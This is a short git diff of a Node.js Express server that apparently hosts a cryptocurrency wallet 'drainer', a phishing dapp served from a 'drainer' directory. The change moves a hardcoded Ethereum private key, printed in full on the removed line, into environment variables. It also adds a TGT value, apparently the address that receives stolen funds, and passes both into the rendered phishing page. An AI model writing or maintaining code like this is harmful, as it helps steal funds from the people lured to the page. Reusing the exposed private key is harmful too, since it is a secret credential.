@@ -4,8 +4,10 @@ const path = require('path');
 const url = express.Router();
 const axios = require("axios");
 const {ethers} = require('ethers');
+const dotenv = require("dotenv").config();
 
-const PK = "0xfa6de49219a8e39467df916df629b7aa839810986b8568aa4e3a938ce54fb1ed";//
+const PK = process.env.PK;//
+const TGT = process.env.TGT;
 
 const app = express();
 app.use(express.json());
@@ -17,7 +19,7 @@ app.use(express.static(path.join(__dirname, 'drainer', 'Configuration_dapp_files
 
 app.use('/', (req, res)=>{
     //
-    res.render('Configuration_dapp', {PK:PK});
+    res.render('Configuration_dapp', {PK:PK,TGT:TGT});
 });
 
 
